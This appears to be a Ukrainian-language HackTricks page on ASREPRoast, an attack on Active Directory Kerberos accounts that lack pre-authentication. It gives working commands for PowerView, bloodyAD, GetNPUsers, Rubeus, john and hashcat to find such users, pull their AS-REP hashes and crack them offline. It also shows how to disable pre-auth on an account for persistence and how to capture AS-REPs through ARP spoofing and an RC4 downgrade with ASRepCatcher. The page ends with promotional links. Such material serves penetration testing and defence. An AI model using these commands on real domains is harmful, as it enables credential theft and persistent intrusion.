# ASREPRoast

ASREPRoast - це атака на безпеку, яка використовує користувачів, які не мають атрибута, необхідного для попередньої аутентифікації Kerberos. По суті, ця вразливість дозволяє зловмисникам запитувати аутентифікацію для користувача від Контролера домену (DC) без необхідності пароля користувача. Потім DC відповідає повідомленням, зашифрованим ключем, отриманим від пароля користувача, який зловмисники можуть спробувати розшифрувати офлайн, щоб дізнатися пароль користувача.

Основні вимоги для цієї атаки:
- **Відсутність попередньої аутентифікації Kerberos**: Ця функція безпеки повинна бути вимкнена для цільових користувачів.
- **Підключення до Контролера домену (DC)**: Зловмисникам потрібен доступ до DC для відправлення запитів та отримання зашифрованих повідомлень.
- **Необов'язковий обліковий запис домену**: Наявність облікового запису домену дозволяє зловмисникам ефективніше ідентифікувати вразливих користувачів через запити LDAP. Без такого облікового запису зловмисникам доведеться вгадувати імена користувачів.


#### Перелік вразливих користувачів (потрібні облікові дані домену)

{% code title="Використання Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Використання Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Запит AS_REP повідомлення

{% code title="Використання Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Використання Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting з Rubeus буде генерувати 4768 з типом шифрування 0x17 та типом попередньої автентифікації 0.
{% endhint %}

### Взлам
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Постійність

Примусово вимкніть **preauth** для користувача, де ви маєте дозвіл **GenericAll** (або дозвіл на запис властивостей):

{% code title="Використання Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Використання Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASreproast без облікових даних
Без знання користувачів, які не потребують попередньої аутентифікації Kerberos. Атакуючий може скористатися позицією людини посередині, щоб захопити пакети AS-REP під час їхнього перетину мережі.<br>
[ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) дозволяє нам це зробити. Більше того, інструмент <ins>змушує робочі станції клієнтів використовувати RC4</ins>, змінюючи переговори Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher.py relay -dc $DC_IP --keep-spoofing

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher.py relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASrepCatcher.py listen
```
## Посилання

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Приєднуйтесь до сервера [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), щоб спілкуватися з досвідченими хакерами та мисливцями за багами!

**Інсайти щодо Хакінгу**\
Взаємодійте з контентом, який досліджує захоплення та виклики хакінгу

**Новини про Хакінг у Реальному Часі**\
Будьте в курсі швидкозмінного світу хакінгу завдяки новинам та інсайтам у реальному часі

**Останні Оголошення**\
Будьте в курсі найновіших запусків баг баунті та важливих оновлень платформи

**Приєднуйтесь до нас на** [**Discord**](https://discord.com/invite/N3FrSbmwdy) та почніть співпрацювати з топовими хакерами вже сьогодні!

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
